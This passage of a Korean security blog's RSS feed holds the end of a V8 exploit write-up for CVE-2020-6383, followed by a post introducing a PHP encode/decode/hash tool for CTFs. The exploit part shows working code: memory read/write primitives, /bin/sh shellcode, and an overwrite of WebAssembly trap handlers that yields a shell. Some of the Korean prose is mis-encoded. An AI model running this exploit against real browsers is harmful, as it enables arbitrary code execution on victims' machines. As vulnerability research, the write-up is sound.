    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;wasm_instance_addr&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wasm_instance_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rwx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wasm_instance_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rwx&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rwx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// write&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addrof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arr_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rwx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// alloc&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb848686a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6e69622f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x732f2f2f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xe7894850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1697268&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x24348101&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1010101&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6a56f631&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1485e08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x894856e6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6ad231e6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50f583b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;zz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigUint64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;zz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rwx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// fail wasm exception&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;

setTimeout(main, 500);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;address compressionì´ ì ìš©ëœ v8ì„ ìµìŠ¤í•˜ëŠ”ê±´ ì²˜ìŒì´ë¼ â€œì´ë ‡ê²Œ í•˜ë©´ ëœë‹¤~â€ ë¼ëŠ”ê±¸ ë”°ë¼í•´ì„œ ì½”ë“œë¥¼ ë§Œë“¤ì–´ ë´¤ë‹¤. webassemblyìœ¼ë¡œ &lt;code class=&quot;highlighter-rouge&quot;&gt;rwx&lt;/code&gt;ë¥¼ ë§Œë“¤ë©´ ì—ëŸ¬ í•¸ë“¤ë§ í•˜ëŠ” í•¨ìˆ˜ë“¤ì˜ í¬ì¸í„°ê°€ &lt;code class=&quot;highlighter-rouge&quot;&gt;rwx&lt;/code&gt;ì˜ì—­ì˜ ì‹œì‘ì§€ì  ë¶€ê·¼ì— ìŒ“ì´ê¸¸ë˜ ì´ê±°ë¡œ íŠ¸ë¦¬ê±° í–ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x000029024a482048â”‚+0x0048: 0x00007ffff61d4da0  â†’  &amp;lt;Builtins_ThrowWasmTrapUnreachable+0&amp;gt; push rbp
0x000029024a482050â”‚+0x0050: 0x90660000000225ff
0x000029024a482058â”‚+0x0058: 0x00007ffff61d4f00  â†’  &amp;lt;Builtins_ThrowWasmTrapMemOutOfBounds+0&amp;gt; push rbp
0x000029024a482060â”‚+0x0060: 0x90660000000225ff
0x000029024a482068â”‚+0x0068: 0x00007ffff61d5060  â†’  &amp;lt;Builtins_ThrowWasmTrapUnalignedAccess+0&amp;gt; push rbp
0x000029024a482070â”‚+0x0070: 0x90660000000225ff
0x000029024a482078â”‚+0x0078: 0x00007ffff61d51c0  â†’  &amp;lt;Builtins_ThrowWasmTrapDivByZero+0&amp;gt; push rbp
0x000029024a482080â”‚+0x0080: 0x90660000000225ff
0x000029024a482088â”‚+0x0088: 0x00007ffff61d5320  â†’  &amp;lt;Builtins_ThrowWasmTrapDivUnrepresentable+0&amp;gt; push rbp
0x000029024a482090â”‚+0x0090: 0x90660000000225ff
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
0x000029024a482218â”‚+0x0218: 0x00007ffff61fc340  â†’  &amp;lt;Builtins_DoubleToI+0&amp;gt; push rcx
0x000029024a482220â”‚+0x0220: 0x90660000000225ff
0x000029024a482228â”‚+0x0228: 0x00007ffff5fdfec0  â†’  &amp;lt;Builtins_I32PairToBigInt+0&amp;gt; int3 
0x000029024a482230â”‚+0x0230: 0x90660000000225ff
0x000029024a482238â”‚+0x0238: 0x00007ffff5fdfce0  â†’  &amp;lt;Builtins_I64ToBigInt+0&amp;gt; push rbp
0x000029024a482240â”‚+0x0240: 0x90660000000225ff
0x000029024a482248â”‚+0x0248: 0x00007ffff5fbb4e0  â†’  &amp;lt;Builtins_RecordWrite+0&amp;gt; push rbp
0x000029024a482250â”‚+0x0250: 0x90660000000225ff
0x000029024a482258â”‚+0x0258: 0x00007ffff5fdbf60  â†’  &amp;lt;Builtins_ToNumber+0&amp;gt; push rbp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ëŸ° í•¸ë“¤ëŸ¬ë“¤ì´ ìŒ“ì—¬ìˆëŠ”ë° ì—¬ê¸°ë¥¼ ë‚´ê°€ ì›í•˜ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;rwx&lt;/code&gt;ë¡œ ë®ì–´ë²„ë¦¬ë©´ ì›¹ì–´ì…ˆ ì½”ë“œì—ì„œ í•´ë‹¹ ì—ëŸ¬ê°€ ë‚¬ì„ ë•Œ ê·¸ìª½ìœ¼ë¡œ ë›´ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ì„ ~/hdd/v8/v8/out/x64.release ./d8 ~/Workspace/b.js                                                                                                73f88b5f69
yoff 11
WASM start
offset 51
wasm_instance_addr 8211ed5
rwx 115abb56b000
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wwwlk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wwwlk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wwwlk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,27&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,120&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lpadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,131&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lxd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,132&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sambashare&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,133&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;docker&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
/hdd/v8/v8/out/x64.release
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;reference&quot;&gt;reference&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=1051017&quot;&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=1051017&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lordofpwn.kr/cve-2019-8506-javascriptcore-exploit/&quot;&gt;https://lordofpwn.kr/cve-2019-8506-javascriptcore-exploit/&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 01 Jun 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-06-01/v8-1-day-CVE-2020-6383</link>
        <guid isPermaLink="true">http://localhost:4000/2020-06-01/v8-1-day-CVE-2020-6383</guid>
        
        <category>pwn</category>
        
        <category>cve</category>
        
        
      </item>
    
      <item>
        <title>Web Encode/Decode Code</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìœ ì„ ë™&lt;/p&gt;

&lt;h2 id=&quot;introduce&quot;&gt;[Introduce]&lt;/h2&gt;

&lt;hr /&gt;

&lt;p&gt;CTF ë¬¸ì œë¥¼ í’€ ë•Œ ì™€ ê°œë°œí•  ë•Œ ê°ì¢… ì¸/ë””ì½”ë”© ë° í•´ì‹œí™”ë¥¼ í•œ ë²ˆì— ë³¼ ìˆ˜ ìˆëŠ” ê²Œ ìˆìœ¼ë©´ ì¢‹ì„ ê²ƒ ê°™ì•„. ê³ ë¯¼ ëì— ëˆ„êµ¬ë‚˜ ì´ìš©í•  ìˆ˜ ìˆë„ë¡ Web Language ì œì‘í•˜ì˜€ìŠµë‹ˆë‹¤. (ë³¸ ì½”ë“œëŠ” Mac OS / Linux OSì˜ Docker í”Œë«í¼ ìë™í™” ê¸°ë°˜ìœ¼ë¡œ ì œì‘ë˜ì—ˆìœ¼ë©°, ëª¨ë“  ì½”ë“œëŠ” Gitlab í”„ë¡œì íŠ¸ë¥¼ ì°¸ê³  í•˜ì‹œë©´ ë©ë‹ˆë‹¤.)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/encode.gif&quot; alt=&quot;/assets/encode.gif&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;code-langugage&quot;&gt;[Code Langugage]&lt;/h2&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;í˜„ì¬ ì§€ì›ë˜ëŠ” ì–¸ì–´ëŠ” PHPë¡œ ê¸°ë°˜ ë˜ì–´ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

    &lt;p&gt;â†’ ê¹ƒë©ì— ì˜¬ë¼ì˜¨ PHP ì½”ë“œ/ë„ì»¤íŒŒì¼ì´ ë””ë²„ê¹… ëª¨ë“œ ë° Docker Containerì— ë””ë²„ê¹… ê´€ë ¨ í”„ë¡œê·¸ë¨ì´ ì„¤ì¹˜ ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ ì™¸ë¶€ì—ì„œ ì ‘ì† í•˜ê³ ì í•œë‹¤ë©´ í•´ë‹¹ ê¸°ëŠ¥ì„ Off í•´ì£¼ì‹œê±°ë‚˜ ì œê±° í•´ì£¼ì‹œë©´ ë©ë‹ˆë‹¤.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ì¶”í›„ Python Flaskë„ ì œì‘ë  ì˜ˆì •ì…ë‹ˆë‹¤.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;support-endecode--hash&quot;&gt;[Support En/Decode + Hash]&lt;/h2&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;HASH&lt;/strong&gt;: md2, md4, md5, sha1, sha256, sha384, sha512, NTLMHash, ripemd128, ripemd160, ripemd256, ripemd320ripemd320&lt;strong&gt;, whirlpool, tiger128_3, tiger160_3, tiger192_3, tiger128_4, tiger160_4, tiger192_4, snefru, gost, adler32, crc32, crc32b, haval128_3, haval160_3, haval192_3, haval224_3, haval256_3, haval128_4, haval160_4, haval192_4, haval224_4, haval256_4, haval128_5, haval160_5, haval192_5, haval224_5, haval256_5&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Encode/Decode&lt;/strong&gt; : Base64, URL, HTML, HTML_Entities, Rot13,&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Conversion&lt;/strong&gt; :  String To Hex, Hex To String, String To Binary, Binary To String&lt;/p&gt;

&lt;h2 id=&quot;installing&quot;&gt;[Installing]&lt;/h2&gt;

&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;PHP í”Œë«í¼ì¼ ê²½ìš° &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache&lt;/code&gt;ì™€ &lt;code class=&quot;highlighter-rouge&quot;&gt;PHP&lt;/code&gt;ê°€ ì„¤ì¹˜ê°€ ë˜ì–´ ìˆì–´ì•¼ í•˜ë‚˜ ì—†ëŠ” ê²½ìš° &lt;code class=&quot;highlighter-rouge&quot;&gt;Docker&lt;/code&gt; ë° &lt;code class=&quot;highlighter-rouge&quot;&gt;Docker-compose&lt;/code&gt;ë¡œ ìë™ìœ¼ë¡œ ì»¨í…Œì´ë„ˆí™” ê°€ëŠ¥í•˜ë¯€ë¡œ, ê¼­ ì‚¬ì „ì— ì„¤ì¹˜ë¥¼ í•˜ì…”ì•¼ í•©ë‹ˆë‹¤. (&lt;a href=&quot;https://docs.docker.com/get-docker/&quot;&gt;Docker install Link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://git.d0ngd0nge.xyz:3005/dongdonge_public_project/web_encode&quot;&gt;https://git.d0ngd0nge.xyz:3005/dongdonge_public_project/web_encode&lt;/a&gt; ì—ì„œ ì œì‘ëœ ì½”ë“œë¥¼ Git Cloneìœ¼ë¡œ ë‹¤ìš´ ë°›ì•„ ì› í´ë¦­ìœ¼ë¡œ ì†ì‰½ê²Œ ë„ì»¤í™” ì¤€ë¹„í•˜ê¸°&lt;/li&gt;
  &lt;li&gt;(Mac or Linux ì¼ ê²½ìš°) &lt;code class=&quot;highlighter-rouge&quot;&gt;./compose_start.sh&lt;/code&gt;ë¡œ ë„ì»¤ë¼ì´ì§•&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:1129/index.php&quot;&gt;http://localhost:1129/index.php&lt;/a&gt; ì ‘ì†&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;phphtml-source-example&quot;&gt;[PHP/HTML Source Example]&lt;/h2&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;test&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;style&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
        textarea &lt;span class=&quot;si&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;
        input &lt;span class=&quot;si&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;
       
        &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;textarea&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Encode&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Encode&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onkeyup=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DongDongE('encode')&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;autofocus=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;textarea&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;encode_res&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
